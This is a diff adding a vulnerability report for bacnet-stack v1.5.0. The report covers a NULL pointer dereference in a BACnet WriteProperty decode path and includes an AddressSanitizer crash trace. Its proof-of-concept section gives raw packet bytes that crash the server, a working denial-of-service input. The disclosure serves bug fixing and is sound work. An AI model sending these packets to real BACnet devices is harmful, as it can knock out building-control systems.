@@ -1,0 +1,43 @@
+issue #1317
+
+Summary
+
+A NULL pointer dereference can be triggered in bacnet_device_object_reference_decode() when a WriteProperty request updates OBJECT_STRUCTURED_VIEW / PROP_SUBORDINATE_LIST in bacnet-stack v1.5.0.
+
+The crash occurs because Structured_View_Subordinate_List_Member_Decode() calls:
+
+bacnet_device_object_reference_decode(apdu, apdu_size, NULL);
+and bacnet_device_object_reference_decode() later writes to value->deviceIdentifier in the len == 0 branch even when value == NULL.
+
+This results in a segmentation fault / denial of service.
+
+Affected version: v1.5.0
+
+ASan
+
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==35603==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x5bdd5565f916 bp 0x7ffd78370010 sp 0x7ffd7836ff00 T0)
+==35603==The signal is caused by a WRITE memory access.
+==35603==Hint: address points to the zero page.
+    #0 0x5bdd5565f916 in bacnet_device_object_reference_decode /root/wc/bacnet/v1.5.0-verify/src/bacnet/bacdevobjpropref.c:492:38
+    #1 0x5bdd5558cc60 in Structured_View_Subordinate_List_Member_Decode /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/object/structured_view.c:679:15
+    #2 0x5bdd556558cc in bacnet_array_write /root/wc/bacnet/v1.5.0-verify/src/bacnet/bacdcode.c:5918:19
+    #3 0x5bdd5558bac3 in Structured_View_Write_Property /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/object/structured_view.c:1668:35
+    #4 0x5bdd5552b0ad in Device_Write_Property /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/object/device.c:3500:34
+    #5 0x5bdd555b6eeb in handler_write_property /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/service/h_wp.c:140:27
+    #6 0x5bdd555a6514 in apdu_handler /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/service/h_apdu.c:609:17
+    #7 0x5bdd555185b5 in npdu_handler /root/wc/bacnet/v1.5.0-verify/src/bacnet/basic/npdu/h_npdu.c:279:21
+    #8 0x5bdd5550fe3a in main /root/wc/bacnet/v1.5.0-verify/apps/server/main.c:423:13
+    #9 0x70290fa2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #10 0x70290fa2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #11 0x5bdd55436514 in _start (/root/wc/bacnet/v1.5.0-verify/build-gdbasan/server+0x78514) (BuildId: 313c0d6263b1e368cd38c4758ea44eff9be27400)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV /root/wc/bacnet/v1.5.0-verify/src/bacnet/bacdevobjpropref.c:492:38 in bacnet_device_object_reference_decode
+==35603==ABORTING
+
+PoC
+
+<81><0b><00><19><01><20><ff><ff><00><ff><10><00><c4><02><00><04><e8><22><05><c4><91><00><22><01><04>
+<81><0a><00><1f><01><04><00><05><47><0f><0c><07><40><00><01><19><d3><3e><8f><07><01><2d><41><56><2d><31><2d><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><00><00><00><02><41><41><41><41><41><41><41><41><41><41><41><32><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><ff><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><30><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><10><00><00><00><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><41><be><41><41><41><41><41><41><41><04><00><05><3a><0e><0c><01><c0><00><01><1e><09><4d><09><55><09><08><09><08><09><08><09><09><09><09><09><08><09><09><09><09><09><28><41><41><41><41><41><41><41><41><41><80><00><41><41><41><41><41><41><41><3b><3f>
